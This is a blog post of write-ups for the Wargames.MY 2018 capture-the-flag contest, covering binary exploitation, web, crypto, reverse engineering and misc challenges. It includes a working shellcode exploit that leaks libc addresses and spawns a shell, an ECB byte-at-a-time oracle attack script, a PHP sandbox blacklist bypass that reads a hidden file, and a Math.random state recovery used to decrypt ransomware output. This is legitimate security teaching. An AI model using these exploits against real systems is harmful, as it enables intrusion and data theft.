---
layout: post
title: Wargames.MY 2018 - Challenge writeups
ctf: Wargames.MY 2018
permalink: /wargamesmy-18/writeups
---

## Table of Contents
[**Pwn**](#pwn)
* [babypwn2.0](#babypwn20)
* [faggot2.0](http://daniellimws.github.io/wargamesmy-18/pwn)

[**Web**](#web)
* [PHP Sandbox](php-sandbox)

[**Crypto**](#crypto)
* [aes-ecb-magic](#aes-ecb-magic)
* [ransom](#ransom)

[**Reverse Engineering**](#reverse-engineering)
* [Just Valid It!](#just-valid-it)
* [QuickMEH](#quickmeh)
* [Hackerman](#hackerman)

[**Misc**](#misc)
* [Business Proposal](#business-proposal)
* [You Math Bro?](#you-math-bro)

## Pwn
### babypwn2.0
We are given a vulnerable [binary][babypwn].

The pseudocode something like the following.

```c
char* buf = mmap(NULL, 10, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
write(1, "Give me 10 bytes:\n", 18);
read(0, buf, 10);
(*buf)();   // running buf as a function
```

We are allowed to write 10 bytes of shellcode to execute.

There is a way better solution [here](https://kaizen1996.wordpress.com/2018/12/09/wargames-my-ctf-2018-babypwn2-0-writeup/).

#### Extending write ability
First and foremost, we need to be able to write more shellcode, in order to pop a shell.

```py
from pwn import *

# p = process("./babypwn2")
p = remote("128.199.247.163", 19957)
# libc = ELF("./libc.so")
libc = ELF("./libc6-server.so")
context.arch = 'amd64'

log.info("Payload 1: Get 10 more bytes to write")
payload = ""
payload += asm("lea rax, [rdx+9]")
payload += asm("push 0x400739")
payload += asm("ret")

print len(payload)

pause()

p.send(payload)

log.info("Payload 2: Prepare rdx=0xff")
payload = ""
payload += asm("lea rax, [rdx+18]")
payload += asm("xor rdx, rdx")
payload += asm("dec dl")
payload += asm("ret")

print len(payload)
pause()

p.send(payload)

log.info("Payload 3: Change return addr to skip setting rdx")
payload = ""
payload += asm("push 0x40073e")
payload += asm("ret")

print len(payload)
pause()

p.send(payload)
```

*Working but so bad*

#### Actual shellcode
As if the previous part was not long enough,

```py
log.info("Payload 4: Leak libc addreses")

puts_libc_got = 0x601018
mmap_libc_got = 0x601020

# print libc@got
payload = ""
payload += asm("mov r8, rax")
payload += asm("xor rdi, rdi")
payload += asm("inc rdi")
payload += asm("mov rsi, " + hex(puts_libc_got))
payload += asm("mov rdx, 8")
payload += asm("xor rax, rax")
payload += asm("inc rax")
payload += asm("syscall")

# print mmap@got
payload += asm("xor rdi, rdi")
payload += asm("inc rdi")
payload += asm("mov rsi, " + hex(mmap_libc_got))
payload += asm("mov rdx, 8")
payload += asm("xor rax, rax")
payload += asm("inc rax")
payload += asm("syscall")

# go back to reading more shellcode for the next payload
payload += asm("mov rsi, r8")
payload += asm("sub rsi, 18")
payload += asm("mov rdx, 0x100")
payload += asm("push 0x400741")
payload += asm("ret")

print len(payload)
pause()

p.sendline(payload)

p.recvuntil("10 bytes:\n")
puts_libc = u64(p.recv(8))
mmap_libc = u64(p.recv(8))

log.info("puts@libc: " + hex(puts_libc))
log.info("mmap@libc: " + hex(mmap_libc))

libc_base = puts_libc - libc.symbols["puts"]
log.info("libc base: " + hex(libc_base))

log.info("Payload 5: one_gadget")
one_gadget = libc_base + 0x4f322 # 0x47c46
log.info("one_gadget: " + hex(one_gadget))

payload = ""
payload += asm("mov rax, " + hex(libc_base + libc.symbols["system"]))
payload += asm("push rax")
payload += asm("mov rdi, " + hex(libc_base + 0x1b3e9a))
payload += asm("ret")

pause()
p.sendline(payload)

p.interactive()
```

Or I could have just done,

```py
p.sendline('a' * 18 + asm(shellcraft.amd64.linux.sh(), arch='amd64'))
```

## Web
### PHP Sandbox
In this challenge we are given a PHP site that allows us to run code. But not any code, some are being filted.

First we can try listing the files in this directory, to see what we can work with.

```php
vardump(scandir("."));
```

One of the files is called `.sup3rs3cr3tf1l3.php`. Suspicious. Immediate thought is to read it. However, functions like `fopen`, `highlight_source`, `readfile` were being blacklisted. After some more digging, turns out there's this [`finfo`](http://php.net/manual/en/class.finfo.php), which constructor seems to try to read from a file to initialize the object.

Doing

```php
new Finfo(0, ".sup3rs3cr3tf1l3.php");
```

gives us errors about invalid offsets and types. Nice enough, the error message contained the flag!

## Crypto
### aes-ecb-magic
We are given [server.py][aes_server], which provides a service for encrypting data using [`AES-ECB`](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_(ECB)). The important 4 lines to look at are

```py
aes_input = self.data.decode('utf-8') + flag        # magic!
aes_input = padding(aes_input)                      # pad if not within PADDING_SIZE block-size

# encrypt your input with the most secure algorithm ever!
cipher = AES.new(aes_key.encode(), AES.MODE_ECB)
encrypted_text = cipher.encrypt(aes_input.encode())
```

The thing about the `ECB` mode is that there is a one-to-one mapping between plaintext and ciphertext for every block. Say 
we have a block size of 4 bytes, and if `"AAAA"` encrypts to `"CAFE"` and `"BBBB"` encrypts to `"POOP"`, then `"AAAABBBB"` will encrypt to `"CAFEPOOP"` and `"BBBBAAAA"` will become `"POOPCAFE"`.

So, this is not really secure. We are told that the flag will be appended to our provided data, with some padding at the end to fulfil the block size requirement (so we can simply ignore it).

#### Leaking the flag
Taking our 4 byte block size as an example again, with the flag being, `"FLAG{ABCDE}"`, we can look at the following scenario:

If our input is `"DOG"`, then it will be padded to be `"DOGFLAG{ABCDE}AA"`. Splitting it into blocks, we would have

```
DOGF LAF{ ABCD E}AA
```

How about having our input as `"DOGF"`? We would then have

```
DOGF FLAG {ABC DE}A
```

Notice that the first block is the same for both. According to the property of the `ECB` mode described earlier, this would mean that the first block of ciphertext for both inputs will be the same.

This allows us to brute force the flag character by character, by comparing the ciphertext of the first block for `"DOG"` and `"DOGA"`, `"DOGB"`, `"DOGC"`, and so on. We can then repeat this process for the remaining characters.

The block size of `AES` is 128 bits, i.e. 16 bytes. So we can apply the same logic for this challenge to get the flag, and it's just a matter of implementing the brute forcing. Do refer to the code below that I used to solve this challenge. 

```py
from pwn import *
import string

p = remote("178.128.62.127", 5000)

flag = ""
padding = "A" * 15
block_size = 16

def get_enc(p):
    p.recvuntil("(in hex): ")
    return p.recvline().strip()

while True:
    block_num = len(flag) // block_size
    use_padding = padding[:len(padding) - (len(flag) % block_size)]
    if len(use_padding) == 0:
        p.sendline("A" * 16)
        correct = get_enc(p)[block_size * (block_num + 1) * 2:block_size * 2 * (block_num + 2)]
    else:
        p.sendline(use_padding)
        correct = get_enc(p)[block_size * block_num * 2:block_size * 2 * (block_num + 1)]
    for guess in string.printable:
        p.sendline(use_padding + flag + guess)
        c = get_enc(p)[block_size * block_num * 2:block_size * 2 * (block_num + 1)]
        if c == correct:
            flag += guess
            print flag
            break
```

### ransom
We are given [ransom.js](ransom.js) which is used to encrypt a `flag.zip` file. Their forensics team managed to recover a small part of the original file, given in [recovered.bin][recovered]. The encrypted [`flag.zip.locked`][locked] is given for us to decrypt.

In `ransom.js`, there is this encryption function

```js
function encrypt_file(file) {
    let contents = fs.readFileSync(file);
    let keystream = Buffer.from('');
    while (keystream.length < contents.length) {
        tmp = Buffer.from(random_hex(), 'hex');
        keystream = Buffer.concat([keystream, tmp]);
    }
    for (let i = 0; i < contents.length; i++) {
        contents.writeUInt8(contents[i] ^ keystream[i], i);
    }
    fs.writeFileSync(file + '.locked', contents);
    fs.unlinkSync(file);
}
```

which in short just hex-encodes random numbers, each of which is converted into an 8-byte array, that is used to generate the keystream to xor-encrypt the plaintext, in this case our `flag.zip` file.

The random number generator is as follows

```js
function random_hex() {
    return Math.random()
        .toString(16)
        .substr(2)
        .padEnd(13, '0')
        .padStart(16, '0');
}
```

As `Math.random()` returns `double`s between `0` to `1`, the `.toString(16)...` part is just to convert them into their hexidecimal representation and pad them to fit 8 bytes for the keystream.

#### Is random secure?

Looking back at the given `recovered.bin`, which contains 32 bytes, it means that we can xor them with the encrypted file to recover 32 bytes of the keystream, in other words 4 numbers.

We are also told in the challenge description that this is a node.js program, and node uses chrome's v8 javascript engine. v8's implementation of `Math.random()` uses the [`XorShift128+`](https://en.wikipedia.org/wiki/Xorshift) algorithm, which is NOT cryptographically secure, meaning that we can predict the following random numbers once we have sufficient information.

In this case, we just need 3 consecutive numbers generated from the RNG, then we can use [`z3`](https://github.com/Z3Prover/z3) to solve for the states required to generate the rest of the random numbers. This [article](https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f) explains the algorithm, as well as how to solve for the states really well, so please do look into it for more information.

At the meantime, the author has published his [code](https://github.com/TACIXAT/XorShift128Plus) on Github, so we can just "steal" it for this challenge.

```py
# Symbolic execution of xs128p
def sym_xs128p(slvr, sym_state0, sym_state1, generated, browser):
    s1 = sym_state0
    s0 = sym_state1
    s1 ^= (s1 << 23)
    s1 ^= LShR(s1, 17)
    s1 ^= s0
    s1 ^= LShR(s0, 26)
    sym_state0 = sym_state1
    sym_state1 = s1
    calc = (sym_state0 + sym_state1)

    condition = Bool('c%d' % int(generated * random.random()))
    if browser == 'chrome':
        impl = Implies(condition, (calc & 0xFFFFFFFFFFFFF) == int(generated))
    elif browser == 'firefox' or browser == 'safari':
        # Firefox and Safari save an extra bit
        impl = Implies(condition, (calc & 0x1FFFFFFFFFFFFF) == int(generated))

    slvr.add(impl)
    return sym_state0, sym_state1, [condition]
```
*Generating the formulas to be solved by z3*

```py
def main():
    dubs = [0.742293984219203562, 0.593954303952432650, 0.779133218474818312]
    if browser == 'chrome':
        dubs = dubs[::-1]

    print dubs

    # from the doubles, generate known piece of the original uint64
    generated = []
    for idx in xrange(3):
        if browser == 'chrome':
            recovered = struct.unpack('<Q', struct.pack('d', dubs[idx] + 1))[0] & 0xFFFFFFFFFFFFF
        elif browser == 'firefox':
            recovered = dubs[idx] * (0x1 << 53)
        elif browser == 'safari':
            recovered = dubs[idx] / (1.0 / (1 << 53))
        generated.append(recovered)

    # setup symbolic state for xorshift128+
    ostate0, ostate1 = BitVecs('ostate0 ostate1', 64)
    sym_state0 = ostate0
    sym_state1 = ostate1
    slvr = Solver()
    conditions = []

    # run symbolic xorshift128+ algorithm for three iterations
    # using the recovered numbers as constraints
    for ea in xrange(3):
        sym_state0, sym_state1, ret_conditions = sym_xs128p(slvr, sym_state0, sym_state1, generated[ea], browser)
        conditions += ret_conditions

    if slvr.check(conditions) == sat:
        # get a solved state
        m = slvr.model()
        state0 = m[ostate0].as_long()
        state1 = m[ostate1].as_long()

        print "Found states"
        print state0, state1
```
*Putting everything together and passing the generated formula to z3*

#### Solution
At this point, the solution is quite simple. I wrote a simple script to convert the "hexed" numbers back into their floating point values to be used by the solver.

Then the rest is quite straightforward, let our solver solve for the states, and once we know the states, generate the numbers, convert them into their hex representation, and use them to decrypt `flag.zip.locked`.

As the code is quite long, you can look at it [here][ransom_sol].


## Reverse Engineering
### Just Valid It!
We are given 3 files, [`flagprint.cs`][flagprint_cs], [`flagprint.exe`][flagprint_exe], and [`PasswordValidation.dll`][passwordval].

The key part of `flagprint.cs` is as follows:
```cs
internal static class NativeMethods
{
    /// <summary>Checks the validity of the specified password.</summary>
    /// <param name="password">The password to validate.</param>
    /// <returns>0 if the password is valid, otherwise non-zero.</returns>
    [DllImport("PasswordValidation")]
    internal static extern int IsPasswordValid(string password);
}

public static void Main()
{
    while (true)
    {
        // read the user's password from stdin
        Console.Write("Enter password: ");
        var password = Console.ReadLine();

        // validate it using the secure authentication library
        Console.Write("Authentication: ");
        if (NativeMethods.IsPasswordValid(password) == 0)
        {
            Console.WriteLine("ACCEPTED!\n");
            Console.WriteLine(String.Format("Flag : {0}", plainText));
            break;
        }
        // the password was rejected
        Console.WriteLine("REJECTED!\n");
    }
    Console.ReadKey();  // don't quit until after a key is pressed
}
```

There is a native function loaded from `PasswordValidation.dll`, which contains an `IsPasswordValid` function to check the password.

However, opening up the dll file and looking at `IsPasswordValid`, we get the following pseudocode

```c
srand(time(0));
return rand();
```

Hmm, maybe I am being trolled. So I opened up the given `flagprint.exe` in DnSpy. It has `ConfusedByAttribute` as one of its modules, which means that it is packed by `ConfuserEx`, obfuscating everything and preventing reverse engineering of the program. One can easily unpack it by using tools like `NoFuserEx` or `UnConfuserEx`. But I just decided to place breakpoints in the main function, and step through to get the code after the program unpacks itself.

So, it seems that the program actually fetches the flag from a server. So now we just need `IsPasswordValid` to return 0. This can easily be done by patching the dll file to return 0.

Running the program again, we get the flag.

### QuickMEH
For this challenge, we are given a PE [application][quickmeh] that asks for the flag. 

This pseudocode is as follows:
```c
double correct = [...];
double constant = ...;
char flag = ...;

for (int i = 0; i < 16; i++) {
    double x = flag[i] >> 4;    // taking the higher 4 bits of the char
    double y = flag[i] & 0xf;   // taking the lower 4 bits of the char

    if (x * constant != correct[i * 2])
        return 0;
    if (y * constant != correct[i * 2 + 1])
        return 0;
}

return 1;
```

So, we need to find the flag by finding the corresponding values that satisfies the requirements above. Normally, if the values to compare with are integers, it is very easy to do it. We can just look into the memory and copy those numbers that are being compared.

However, this time, it is with floating point numbers. Integers like `1` will be saved as something like `0x400cbe00000000` in the floating point registers. Definitely not fun to look at. But, we need a way to make sense of the numbers in those floating point registers to find our flag.

#### Brute force
Or, maybe we don't. We can just brute force the flag character by character, since each character does not affect the others in our flag. But, don't do it by hand, of course.

We can make use of unicorn to emulate floating point multiplication, by first converting our integer to the floating point representation, then multiplying it with `constant`.

```py
def getxmm0(n):
    # code to be emulated
    X86_CODE32 = asm("cvtdq2pd xmm0, xmm0") # convert dword(integer) to xmm(floating point)
    X86_CODE32 += asm("mulsd xmm0, xmm1")   # multiply

    # memory address where emulation starts
    ADDRESS = 0x1000000

    try:
        mu = Uc(UC_ARCH_X86, UC_MODE_32)
        mu.mem_map(ADDRESS, 2 * 1024 * 1024)
        mu.mem_write(ADDRESS, X86_CODE32)
        mu.reg_write(UC_X86_REG_XMM0, n)    # set xmm0 to be our integer
        mu.reg_write(UC_X86_REG_XMM1, 0x00000000000000004036800000000000)   # set xmm1 to be the constant
        mu.emu_start(ADDRESS, ADDRESS + len(X86_CODE32))

        r_xmm0 = mu.reg_read(UC_X86_REG_XMM0)
        return r_xmm0

    except UcError as e:
        print("ERROR: %s" % e)
```

With this, we can get a mapping from integer to floating point.

```py
d = {}
for i in range(0x10):
    d[getxmm0(i)] = i
```

Lastly, we can copy the `correct` floating point values from the binary, and then use this mapping to give us our flag.

You can find the solution [here][quickmehsol].

### Hackerman
We are presented with a website that prompts for the flag. There is a [`code.js`][hackermancode] that looks to be heavily obfuscated, containing a `verifyKey` function.

```js
function verifyKey(password) {
    var unicorn = new uc['Unicorn'](uc['ARCH_X86'], uc[i_hate_you___0x441f('0x5', '^(lH')]);
    unicorn['mem_map'](0x8040000, 0x400 * 0x400, uc['PROT_ALL']);
    unicorn['mem_write'](0x8040000, code);
    unicorn['mem_write'](0x8040000 + 0x1000, ord(password));
    unicorn['reg_write_i32'](uc['X86_REG_ESP'], 0x8040000 + 0x5000);
    mem_write_i32(unicorn, 0x8040000, 0x5000 + 0x4, 0x8040000 + 0x1000);
    mem_write_i32(unicorn, 0x8040000 + 0x5000 + 0x8, password['length']);
    unicorn['emu_start'](0x8040000, 0x8040000 + code['length'], 0x0, 0x0);
    return unicorn[i_hate_you___0x441f('0x6', 'Kemw')](uc['X86_REG_EAX']);
}
```
*The code was slightly modified for readability sake*

Originally, the variable was not named `unicorn`, it was just another randomly generated string. However, it looks so similar to the [tutorial](http://www.unicorn-engine.org/docs/tutorial.html) code for Unicorn.

So it looks like this function emulates x86 code to check our flag. Interesting.

#### Getting everything locally
To analyze this, we need to get the code onto our computer. So, placing breakpoints around the code in Chrome/Firefox's developer tools, we can print the `code` onto our console, and save it into a file for analyzing.

With some reversing, we get that the pseudocode for the checking is something like this
```py
for i in range(32):
    flag[i] ^= (i + 1) * 2

for k in range(31):
    flag[30 - k + 1] ^= flag[30 - k]

for k in range(31):
    flag[k] ^= flag[k + 1]

return flag == some_buffer
```

So, quite straightforward, just get the bytes in `some_buffer`, and reverse the steps above to find the flag.

#### Running the code
What if you are like me, who implemented the calculation of the flag wrongly, and could not figure out why, and need to run the given code to do some debugging?

One way is to rewrite the code in C and compile it, but I don't like that, since my interpretation of the code could be wrong to start with. Another way would be to link the code into ELF format using tools like `ld`, but that is also very painfully troublesome. 

Since the challenge is given with code being emulated in unicorn, why not do that as well
```py
X86_CODE32 = [...]  # flag checking code

mu = Uc(UC_ARCH_X86, UC_MODE_32)
mu.mem_map(ADDRESS, 0x400 * 0x400)
mu.mem_write(ADDRESS, X86_CODE32)
mu.mem_write(0x8040000 + 0x1000, ''.join(map(chr, [79, 43, 49, 75, 12, 114, 72, 53, 105, 37, 53, 24, 3, 93, 120, 68, 29, 115, 61, 17, 3, 38, 64, 66, 5, 122, 53, 79, 79, 107, 38, 42])))
mu.mem_write(0x8040000 + 0x5000 + 0x4, p32(0x8040000 + 0x1000))
mu.mem_write(0x8040000 + 0x5000 + 0x8, p32(0x20))
mu.reg_write(UC_X86_REG_ESP, 0x8040000 + 0x5000)    
mu.hook_add(UC_HOOK_CODE, hook_code)
mu.emu_start(ADDRESS, ADDRESS + len(X86_CODE32))  

print(mu.reg_read(UC_X86_REG_EAX))  
```

You can find my solution code [here][hackermansolve].

## Misc
### Business proposal
We are given a [file][business_proposal] with contents
```
Dear Business person ; This letter was specially selected 
to be sent to you . If you no longer wish to receive 
our publications simply reply with a Subject: of "REMOVE" 
and you will immediately be removed from our club . 
This mail is being sent in compliance with Senate bill 
2516 , Title 6 , Section 301 . THIS IS NOT A GET RICH 
...
```

Looks like some text steganography. Entering part of the text into Google gives [spammimic](http://www.spammimic.com/). Pasting this whole chunk of text into the decode section of the site gives us the flag.

### You Math Bro?
Connecting to the provided service, we are told we need to solve 30 maths challenges in 40 seconds. We can automate this process using a script.

```py
from pwn import *

p = remote("206.189.93.101", 4343)

p.sendline("start")

for i in range(30):
    p.recvuntil("/30] ")
    exp = p.recv(7).replace("x", "*")
    ans = str(eval(exp))
    p.sendline(ans)
    print exp + " = " + ans

p.interactive()
```

***

[babypwn]:{{site.baseurl}}/ctfs/wargamesmy-18/babypwn2/babypwn2
[babypwnxpl]:{{site.baseurl}}/ctfs/wargamesmy-18/babypwn2/solve.py
[business_proposal]:{{site.baseurl}}/ctfs/wargamesmy-18/business_proposal/file.txt
[aes_server]:{{site.baseurl}}/ctfs/wargamesmy-18/aes/server.py
[ransom]:{{site.baseurl}}/ctfs/wargamesmy-18/ransom/ransom.js
[recovered]:{{site.baseurl}}/ctfs/wargamesmy-18/ransom/recovered.bin
[locked]:{{site.baseurl}}/ctfs/wargamesmy-18/ransom/flag.zip.locked
[ransom_sol]:{{site.baseurl}}/ctfs/wargamesmy-18/ransom/solve.py
[flagprint_cs]:{{site.baseurl}}/ctfs/wargamesmy-18/justvalidit/flagprint.cs
[flagprint_exe]:{{site.baseurl}}/ctfs/wargamesmy-18/justvalidit/flagprint.exe
[passwordval]:{{site.baseurl}}/ctfs/wargamesmy-18/justvalidit/PasswordValidation.dll
[quickmeh]:{{site.baseurl}}/ctfs/wargamesmy-18/quickmeh/quickmeh.exe
[quickmehsol]:{{site.baseurl}}/ctfs/wargamesmy-18/quickmeh/solve.py
[hackermancode]:{{site.baseurl}}/ctfs/wargamesmy-18/hackerman/code.js
[hackermansolve]:{{site.baseurl}}/ctfs/wargamesmy-18/hackerman/solve.py